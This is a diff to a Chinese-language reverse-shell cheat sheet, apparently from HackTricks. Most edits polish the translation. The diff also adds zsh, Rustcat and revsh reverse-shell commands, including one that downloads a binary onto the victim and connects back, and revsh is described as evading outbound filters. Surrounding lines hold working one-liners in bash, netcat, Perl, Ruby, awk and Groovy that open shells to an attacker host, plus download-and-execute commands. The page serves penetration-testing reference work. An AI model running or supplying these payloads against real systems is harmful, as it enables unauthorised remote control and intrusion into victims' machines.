@@ -6,7 +6,7 @@
 
 ## Full TTY
 
-**一旦你获得了一个反向shell**[ **请阅读此页面以获取完整的TTY**](full-ttys.md)**。**
+**一旦你获得了反向shell**[ **请阅读此页面以获取完整的TTY**](full-ttys.md)**。**
 
 ## Bash | sh
 ```bash
@@ -34,11 +34,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Shell 解释
 
-1. **`bash -i`**: 该命令的这一部分启动一个交互式 (`-i`) Bash shell。
-2. **`>&`**: 该命令的这一部分是 **重定向标准输出** (`stdout`) 和 **标准错误** (`stderr`) 到 **同一目的地** 的简写表示法。
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 这是一个特殊文件，**表示与指定 IP 地址和端口的 TCP 连接**。
-- 通过 **将输出和错误流重定向到此文件**，该命令有效地将交互式 shell 会话的输出发送到攻击者的机器。
-4. **`0>&1`**: 该命令的这一部分 **将标准输入 (`stdin`) 重定向到与标准输出 (`stdout`) 相同的目的地**。
+1. **`bash -i`**: 该命令的这一部分启动一个交互式（`-i`）Bash shell。
+2. **`>&`**: 该命令的这一部分是一个简写符号，用于**将标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到同一目标**。
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 这是一个特殊文件，**表示与指定IP地址和端口的TCP连接**。
+- 通过**将输出和错误流重定向到此文件**，该命令有效地将交互式shell会话的输出发送到攻击者的机器。
+4. **`0>&1`**: 该命令的这一部分**将标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目标**。
 
 ### 创建文件并执行
 ```bash
@@ -47,11 +47,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-在处理基于 Linux 的 Web 应用程序中的 **Remote Code Execution (RCE)** 漏洞时，实现反向 shell 可能会受到网络防御的阻碍，例如 iptables 规则或复杂的数据包过滤机制。在这种受限环境中，另一种方法是建立一个 PTY（伪终端）shell，以更有效地与被攻陷的系统进行交互。
+在处理基于Linux的Web应用程序中的**远程代码执行（RCE）**漏洞时，实现反向shell可能会受到网络防御措施的阻碍，例如iptables规则或复杂的数据包过滤机制。在这种受限环境中，另一种方法是建立一个PTY（伪终端）shell，以更有效地与被攻陷的系统进行交互。
 
-推荐的工具是 [toboggan](https://github.com/n3rada/toboggan.git)，它简化了与目标环境的交互。
+为此推荐的工具是[toboggan](https://github.com/n3rada/toboggan.git)，它简化了与目标环境的交互。
 
-要有效使用 toboggan，请创建一个针对目标系统 RCE 上下文的 Python 模块。例如，一个名为 `nix.py` 的模块可以结构如下：
+要有效使用toboggan，请创建一个针对目标系统RCE上下文量身定制的Python模块。例如，一个名为`nix.py`的模块可以结构如下：
 ```python3
 import jwt
 import httpx
@@ -79,15 +79,15 @@ return response.text
 ```shell
 toboggan -m nix.py -i
 ```
-直接利用交互式 shell。您可以添加 `-b` 以实现 Burpsuite 集成，并移除 `-i` 以获得更基本的 rce 包装器。
+直接利用交互式 shell。您可以添加 `-b` 以进行 Burpsuite 集成，并移除 `-i` 以获得更基本的 rce 包装器。
 
 另一种可能性是使用 `IppSec` 的前向 shell 实现 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。
 
 您只需修改：
 
 - 漏洞主机的 URL
-- 有效负载的前缀和后缀（如果有的话）
-- 有效负载的发送方式（头部？数据？额外信息？）
+- 您的有效负载的前缀和后缀（如果有的话）
+- 发送有效负载的方式（头部？数据？额外信息？）
 
 然后，您可以直接 **发送命令**，甚至 **使用 `upgrade` 命令** 来获取完整的 PTY（请注意，管道的读取和写入大约有 1.3 秒的延迟）。
 
@@ -101,7 +101,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-在 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) 中查看
+在 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) 中查看它
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -137,7 +137,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## 红宝石
+## Ruby
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -219,9 +219,51 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (内置 TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – 现代的类似 netcat 的监听器，用 Rust 编写（自 2024 年起在 Kali 中打包）。
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+特性：
+- 可选的 `--ssl` 标志用于加密传输（TLS 1.3）
+- `-s` 用于在受害者上生成任何二进制文件（例如 `/bin/sh`、`python3`）
+- `--up` 自动升级为完全交互式 PTY
+
+## revsh（加密和可用于跳板）
+
+`revsh` 是一个小型 C 客户端/服务器，通过 **加密的 Diffie-Hellman 隧道** 提供完整的 TTY，并可以选择附加 **TUN/TAP** 接口以进行类似 VPN 的反向跳板。
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+有用的标志：
+- `-b` : 绑定 shell 而不是反向
+- `-p socks5://127.0.0.1:9050` : 通过 TOR/HTTP/SOCKS 代理
+- `-t` : 创建一个 TUN 接口（反向 VPN）
+
+由于整个会话是加密和多路复用的，它通常可以绕过简单的出站过滤，这会终止明文的 `/dev/tcp` shell。
+
 ## OpenSSL
 
-攻击者 (Kali)
+攻击者（Kali）
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -259,7 +301,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-要发送命令，请写下它，按回车，然后按CTRL+D（以停止STDIN）
+要发送命令，请写下它，按回车，然后按CTRL+D（停止STDIN）
 
 **受害者**
 ```bash
@@ -296,7 +338,7 @@ close(Service)
 ```bash
 xterm -display 10.0.0.1:1
 ```
-要捕获反向 shell，您可以使用（将在 6001 端口监听）：
+要捕获反向 shell，您可以使用（将监听端口 6001）：
 ```bash
 # Authorize host
 xhost +targetip
@@ -305,18 +347,20 @@ Xnest :1
 ```
 ## Groovy
 
-由 [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注意：Java 反向 shell 也适用于 Groovy
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注意：Java 反向 shell 也适用于 Groovy
 ```bash
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## 参考
+## 参考文献
 
 - [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
